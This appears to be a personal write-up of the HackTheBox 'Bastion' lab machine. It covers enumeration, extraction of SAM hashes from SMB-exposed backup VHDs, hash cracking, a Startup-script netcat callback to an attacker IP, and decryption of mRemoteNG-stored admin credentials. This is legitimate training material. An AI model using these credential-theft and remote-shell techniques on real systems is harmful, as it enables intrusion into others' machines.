---
date: 2024-10-14
title: Bastion HTB Write-Up
machine_ip: 10.10.10.134
os: Windows
difficulty: Easy
my_rating: 2
tags:
  - Windows
  - PrivEsc
  - mRemoteNG
  - searchsploit
  - nc
  - SimpleHTTPServer
  - SCP
  - rustscan
  - smbclient
  - SMB
  - RPC
  - rpcclient
  - MSFvenom
  - secretsdump
  - SAM
  - hashcat
  - CVE-2023-30367
references: "[[📚CTF Box Writeups]]"
---

# Enumeration

- Rustscan
```
┌──(root㉿kali)-[~/Downloads]
└─# rustscan -a 10.10.10.134 -t 500 -b 500 -- -sVC -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.134:22
Open 10.10.10.134:135
Open 10.10.10.134:139
Open 10.10.10.134:445
Open 10.10.10.134:5985
Open 10.10.10.134:47001
Open 10.10.10.134:49664
Open 10.10.10.134:49665
Open 10.10.10.134:49666
Open 10.10.10.134:49667
Open 10.10.10.134:49668
Open 10.10.10.134:49669
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sVC -Pn" on ip 10.10.10.134
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-14 15:52 UTC
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:52
Completed NSE at 15:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:52
Completed NSE at 15:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:52
Completed NSE at 15:52, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:52
Completed Parallel DNS resolution of 1 host. at 15:52, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:52
Scanning 10.10.10.134 [12 ports]
Discovered open port 139/tcp on 10.10.10.134
Discovered open port 49664/tcp on 10.10.10.134
Discovered open port 445/tcp on 10.10.10.134
Discovered open port 22/tcp on 10.10.10.134
Discovered open port 49665/tcp on 10.10.10.134
Discovered open port 47001/tcp on 10.10.10.134
Discovered open port 49668/tcp on 10.10.10.134
Discovered open port 135/tcp on 10.10.10.134
Discovered open port 5985/tcp on 10.10.10.134
Discovered open port 49667/tcp on 10.10.10.134
Discovered open port 49669/tcp on 10.10.10.134
Discovered open port 49666/tcp on 10.10.10.134
Completed Connect Scan at 15:52, 0.21s elapsed (12 total ports)
Initiating Service scan at 15:52
Scanning 12 services on 10.10.10.134
Service scan Timing: About 58.33% done; ETC: 15:54 (0:00:39 remaining)
Completed Service scan at 15:53, 55.23s elapsed (12 services on 1 host)
NSE: Script scanning 10.10.10.134.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:53
Completed NSE at 15:53, 10.93s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:53
Completed NSE at 15:53, 0.46s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:53
Completed NSE at 15:53, 0.00s elapsed
Nmap scan report for 10.10.10.134
Host is up, received user-set (0.11s latency).
Scanned at 2024-10-14 15:52:26 UTC for 67s

PORT      STATE SERVICE      REASON  VERSION
22/tcp    open  ssh          syn-ack OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=
|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26941/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 63108/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 18741/udp): CLEAN (Failed to receive data)
|   Check 4 (port 29159/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-10-14T15:53:23
|_  start_date: 2024-10-14T15:50:41
|_clock-skew: mean: -39m58s, deviation: 1h09m13s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-10-14T17:53:27+02:00

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:53
Completed NSE at 15:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:53
Completed NSE at 15:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:53
Completed NSE at 15:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.14 seconds

```
- We find #SSH, #SMB , #RPC , #HTTP on this box.
	- The http ports go to a 404 site
	- Most likely a foothold in SMB that can lead us to use SSH later
- #smbclient allows us to list shares with no login
```
┌──(root㉿kali)-[~/Downloads]
└─# smbclient -N -L \\\\10.10.10.134

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- We can login to the `IPC$` share with no login, but there is nothing to find it appears.
```
┌──(root㉿kali)-[~/Downloads]
└─# smbclient \\\\10.10.10.134\\IPC$
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> 
```
- We can also login to the `backups` share without a login, here we find a note
```
┌──(root㉿kali)-[~/Downloads]
└─# smbclient \\\\10.10.10.134\\backups
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 16 03:02:11 2019
  ..                                  D        0  Tue Apr 16 03:02:11 2019
  note.txt                           AR      116  Tue Apr 16 03:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 04:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 04:44:02 2019

                5638911 blocks of size 4096. 1177196 blocks available
```
- The note is a reminder: "Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow."
	- This is a hint, we should look for that backup file
	- In the directory `\\10.10.10.134\backups\WindowsImageBackup\L4mpje-PC\` we find 4 data files, one in parent directory, one in the `SPPMetadataCache` folder and two in the `Catalog` folder.
	- These are WindowsImageBackup Folders, created when a backup is made
	- We can `cd` to the Backup folder with XMLs in it by putting the directory in double `"`
```
smb: \WindowsImageBackup\L4mpje-PC\> cd "Backup 2019-02-22 124351"
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> ls
  .                                  Dn        0  Fri Feb 22 04:45:32 2019
  ..                                 Dn        0  Fri Feb 22 04:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 04:44:02 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 04:44:03 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 04:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 04:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 04:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 04:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 04:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 04:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 04:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 04:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 04:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 04:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 04:45:32 2019

                5638911 blocks of size 4096. 1176790 blocks available
```
- After mounting the two `vhd` files and searching around, we find one with a whole Windows file system
```
sudo modprobe nbd max_part=8
sudo qemu-nbd -c /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
sudo mount /dev/nbd0p1 /mnt
```
- Surely we can find something here
- We find `SAM` files and `SYSTEM` in `Windows/System32/config` folder. Both should contain credentials to users!
	- Manually searching is unsuccessful
	- Use `secretsdump.py` to extract hashes. Already in directory with `SAM` and `SYSTEM` files:
```
┌──(root㉿kali)-[/mnt/Windows/System32/config]
└─# secretsdump.py LOCAL -sam SAM -system SYSTEM
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up... 
```
- Now we try to crack these SAM hashes.


# Foothold
- gain shell
- Saved the `SAM` hashes to a `.txt` and cracked `SAM` hash for `L4mpje` using `hashcat` #SAM #hashcat 
```
┌──(root㉿kali)-[/mnt/Windows/System32/config]
└─# hashcat -m 1000 -a 0 /root/Downloads/sam.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 7800X3D 8-Core Processor, 14991/30047 MB (4096 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

INFO: Removed hash found as potfile entry.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

26112010952d963c8dc4217daec986d9:bureaulampje             
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: /root/Downloads/sam.txt
Time.Started.....: Mon Oct 14 12:13:24 2024 (2 secs)
Time.Estimated...: Mon Oct 14 12:13:26 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5527.3 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 1/2 (50.00%) Digests (new)
Progress.........: 9400320/14344385 (65.53%)
Rejected.........: 0/9400320 (0.00%)
Restore.Point....: 9394176/14344385 (65.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: burlfish85 -> buneybuney
Hardware.Mon.#1..: Util: 27%

Started: Mon Oct 14 12:13:23 2024
Stopped: Mon Oct 14 12:13:27 2024
```
- We now have the creds `L4mpje:bureaulampje`

- Using the creds, we can log in using `rpcclient` #RPC #rpcclient 
	- No commands work
- Let's try to login using `SSH`
```
┌──(root㉿kali)-[~/Downloads]
└─# ssh 'L4mpje'@10.10.10.134
The authenticity of host '10.10.10.134 (10.10.10.134)' can't be established.
ED25519 key fingerprint is SHA256:2ZbIDKRPlngECX1WSMqnucdOWthIaPG7wQ6mBReac7M.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.134' (ED25519) to the list of known hosts.
L4mpje@10.10.10.134's password: 
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
l4mpje@BASTION C:\Users\L4mpje>whoami
bastion\l4mpje 
```
- Success, although I was getting SSH error `bad key types` and `bad configuration options`. The solution was to comment out of `/etc/ssh/ssh_config` the following line:
```
# Include /etc/ssh/ssh_config.d/*.conf
```
- Once, done. SSH with the creds gave us a user shell
```
┌──(root㉿kali)-[~/Downloads]
└─# ssh 'L4mpje'@10.10.10.134
L4mpje@10.10.10.134's password: 

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>whoami
bastion\l4mpje
```

- User flag - `l4mpje`
```
l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                     
6c3d56614e31bc8a2be0e58c9657716e 
```
# PrivEsc
[[Privilege Escalation]], [[🦊TCM Security/PrivEsc_Windows/1_Initial_Enumeration]]
- escalate to root
- Let's transfer tools to check for vulnerabilities 
	- #windows-exploit-suggester  using #SCP 
```
┌──(root㉿kali)-[~/Downloads]
└─# scp windows-exploit-suggester.py L4mpje@10.10.10.134:wes.py  
L4mpje@10.10.10.134's password: 
windows-exploit-suggester.py               100%   68KB 145.3KB/s   00:00 
```
- python does not appear to be installed
- Also, transfer #winPEAS and #PowerUp using #SCP 

- Identified many vulnerabilities, first that stood out was an Unquoted Autorun #UnquotedServicePaths #Autoruns 
	- File: `C:\Program Files\VMware\VMware Tools\vmtoolsd.exe` -n vmusr (Unquoted and Space detected)  oted and Space detected)
	- Also File: `C:\Program Files\Internet Explorer\iexplore.exe` %1 (Unquoted and Space detected) - `C:\`     Space detected) - `C:\`
	- And other unquoted service paths...
	- We can try to transfer a payload in this path to be called upon service restart/logon
- Also, identified #StartUp attack paths
- With `PowerUp.ps1` the only PrivEsc attack path identified is a #DLLHijacking attack
```
ModifiablePath    : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps
IdentityReference : BASTION\L4mpje
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'  
```

- Cannot move payload to `C:\Program Files\`. Access is denied
- Reviewing the ouput of `winPEAs` I find a batch file in `L4mpje` Startup folder
```
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>type L4mpje-script.bat                                         
NET USE Z: "\\192.168.1.74\Backups" /user:L4mpje bureaulampje
```
- Lets change this to use `nc` (transfer `nc.exe` to RHOST)
```
(echo @echo off & echo C:\Users\L4mpje\nc.exe -v 10.10.14.5 443) > "C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\L4mpje-script.bat"
```
- With my `nc` listener, all I got was a mirrored shell...

- A lot of time and research and digging later, I find #mRemoteNG folder in `Program Files`
	- This [exploit](https://www.exploit-db.com/exploits/51637)shows that you can dump cleartext passwords from memory
	- Also found in #searchsploit , #CVE-2023-30367
```
l4mpje@BASTION C:\Program Files (x86)>dir            
 Volume in drive C has no label.          
 Volume Serial Number is 1B7D-E692          
 Directory of C:\Program Files (x86)       
22-02-2019  15:01    <DIR>          .      
22-02-2019  15:01    <DIR>          ..
16-07-2016  15:23    <DIR>          Common Files          
23-02-2019  10:38    <DIR>          Internet Explorer     
16-07-2016  15:23    <DIR>          Microsoft.NET          
22-02-2019  15:01    <DIR>          mRemoteNG            
23-02-2019  11:22    <DIR>          Windows Defender      
23-02-2019  10:38    <DIR>          Windows Mail          
23-02-2019  11:22    <DIR>          Windows Media Player 
16-07-2016  15:23    <DIR>          Windows Multimedia Platform  
16-07-2016  15:23    <DIR>          Windows NT                 
23-02-2019  11:22    <DIR>          Windows Photo Viewer        
16-07-2016  15:23    <DIR>          Windows Portable Devices    
16-07-2016  15:23    <DIR>          WindowsPowerShell     

               0 File(s)              0 bytes
              14 Dir(s)   4.761.444.352 bytes free  
```

- Since the exploit is written in python and python is not installed on the RHOST, I did more research...
- Turns out the file that mRemoteNG uses to store encrypted user passwords is `confCons.xml` and it is located in the Users `AppData` folder.
	- Under the directory `C:\Users\L4mpje\AppData\Roaming\mRemoteNG`, we find the admins password AES encrypted with GCM block cypher, 1000 Kdf Iterations
```
Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
```
- So we have the Password string , now we will use the python script to [decrypt](https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper) it (**_the string looks like base64 and I decoded it earlier but it gave gibbrish so no use for b64 decode_**)
```
┌──(root㉿kali)-[~/Downloads]
└─# python ./mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2
```

- Let's try to SSH as Admin
```
┌──(root㉿kali)-[~/Downloads]
└─# ssh Administrator@10.10.10.134          
Administrator@10.10.10.134's password: 

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.                                                              
administrator@BASTION C:\Users\Administrator>whoami              
bastion\administrator 
```

- Root flag - administrator
```
administrator@BASTION C:\Users\Administrator\Desktop>type root.txt
66bfa625bbef47305b23fea8e68a5907 
```